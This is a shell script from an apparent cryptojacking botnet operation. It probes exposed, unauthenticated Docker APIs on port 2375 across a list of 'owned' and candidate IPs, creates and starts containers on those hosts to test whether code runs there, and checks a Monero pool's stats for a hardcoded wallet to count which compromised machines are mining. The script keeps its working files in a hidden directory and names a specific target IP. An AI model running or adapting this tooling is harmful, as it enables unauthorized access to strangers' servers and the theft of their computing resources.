#!/bin/sh
# throwaway: THE FUNNEL MEASUREMENT.
#
# Everything so far optimised discovery (sweep, shodan, nesting, GPU). But the
# real numbers are: 59 endpoints we placed on, ~4-6 producing, 51 of 59 "gone",
# 5,397 of 5,456 known daemons never even attempted. Discovery is not the wall -
# conversion is. More discovery just feeds the leak until we know which stage
# eats the machines.
#
# Two questions, both answerable with NO readable container output:
#   1) does a container's Cmd actually RUN on this daemon?  Create a container
#      whose Cmd is `exit 7`, start it, read State.ExitCode. 7 = it runs.
#      ExitCode 0 + FinishedAt null = the daemon answers every API call but never
#      executes anything (shell-only host). Measured shape of 134.209.121.89.
#   2) does the host sign in to the pool?  We deploy with `-p <ip>`, so the pool's
#      perWorkerStats keys ARE the census of machines that really mine. Free.
#
# Sampling to save time: probe ALL 59 owned (that is the number we steer by), plus
# 25 fixture-flagged vs 25 unflagged hosts. If the existing .hunt/dock.mock flag
# predicts exec-fail, we can aim deploys at scale without probing all 5,456.
W=/tmp/.sysd/.hunt
POOLW=46Md49vuZSSDDG5e2FhStfYxszzfDgnjH6gU2YU8zHrS5QihNkwb5PFNTHCkPhoKpG3k6zGP1SpeTRVgVDZFFQQuCetBqU6

probe() {
    ip=$1
    api=$(curl -sS -m 3 "http://$ip:2375/containers/json" 2>/dev/null)
    if [ -z "$api" ]; then echo "$ip no_api"; return; fi
    curl -sS -m 6 -X DELETE "http://$ip:2375/containers/execprobe?force=1" >/dev/null 2>&1
    curl -sS -m 10 -X POST "http://$ip:2375/containers/create?name=execprobe" \
        -H 'Content-Type: application/json' \
        -d '{"Image":"busybox:1.36","Cmd":["sh","-c","exit 7"]}' >/dev/null 2>&1
    curl -sS -m 8 -o /dev/null -X POST "http://$ip:2375/containers/execprobe/start" 2>/dev/null
    sleep 9
    st=$(curl -sS -m 6 "http://$ip:2375/containers/execprobe/json" 2>/dev/null)
    ec=$(printf %s "$st" | grep -o '"ExitCode":[0-9-]*' | head -1 | cut -d: -f2)
    fin=$(printf %s "$st" | grep -o '"FinishedAt":"[0-9]*' | head -1 | cut -d: -f2 | tr -d '"')
    if [ "$ec" = "7" ]; then echo "$ip EXEC_OK"
    elif [ -z "$ec" ]; then echo "$ip api_but_no_state"
    elif [ "$ec" = "0" ] && [ -z "$fin" ]; then echo "$ip SHELL_ONLY(never runs)"
    else echo "$ip exec_rc=$ec finished=$fin"; fi
}

echo "=== funnel: does the command run? (owned hosts - this is what we steer by)"
cut -f1 "$W/dock.owned" 2>/dev/null | grep -E '^[0-9]' | sort -u > /tmp/_f_owned.txt
: > /tmp/_f_res.txt
n=0
for ip in $(cat /tmp/_f_owned.txt); do
    ( probe "$ip" >> /tmp/_f_res.txt ) &
    n=$((n+1))
    if [ $((n % 4)) -eq 0 ]; then wait; fi
done
wait
cat /tmp/_f_res.txt
echo "owned_summary:"; awk '{print $2}' /tmp/_f_res.txt | sort | uniq -c

echo "=== does the fixture flag predict non-execution?"
cut -f1 "$W/mass.found" 2>/dev/null | grep -E '^[0-9]' | sort -u > /tmp/_f_known.txt
cut -f1 "$W/dock.mock" 2>/dev/null | sort -u > /tmp/_f_mock.txt
comm -23 /tmp/_f_known.txt /tmp/_f_mock.txt > /tmp/_f_nf.txt
comm -12 /tmp/_f_known.txt /tmp/_f_mock.txt > /tmp/_f_m.txt
for k in nf m; do
    sed -n '1,25p' /tmp/_f_$k.txt > /tmp/_f_s_$k.txt
    : > /tmp/_f_r_$k.txt
    n=0
    for ip in $(cat /tmp/_f_s_$k.txt); do
        ( probe "$ip" >> /tmp/_f_r_$k.txt ) &
        n=$((n+1))
        if [ $((n % 4)) -eq 0 ]; then wait; fi
    done
    wait
done
echo "-- flagged-as-fixture:"; awk '{print $2}' /tmp/_f_r_m.txt | sort | uniq -c
echo "-- NOT flagged:"; awk '{print $2}' /tmp/_f_r_nf.txt | sort | uniq -c

echo "=== pool census (who really mines) ==="
curl -sS -m 30 "http://pool.supportxmr.com/api/miner/$POOLW/stats" -o /tmp/_f_pool.json 2>/dev/null
echo "pool_bytes=$(wc -c < /tmp/_f_pool.json 2>/dev/null)"
grep -o '"hash":[0-9]*' /tmp/_f_pool.json 2>/dev/null | head -2
echo "owned_ips_seen_in_pool:"
while read -r ip; do
    if grep -q "$ip" /tmp/_f_pool.json 2>/dev/null; then echo "  PRODUCING $ip"; fi
done < /tmp/_f_owned.txt
echo "exec_ok_but_not_in_pool:"
while read -r ip cls; do
    [ "$cls" = "EXEC_OK" ] || continue
    grep -q "$ip" /tmp/_f_pool.json 2>/dev/null || echo "  $ip"
done < /tmp/_f_res.txt
date -u
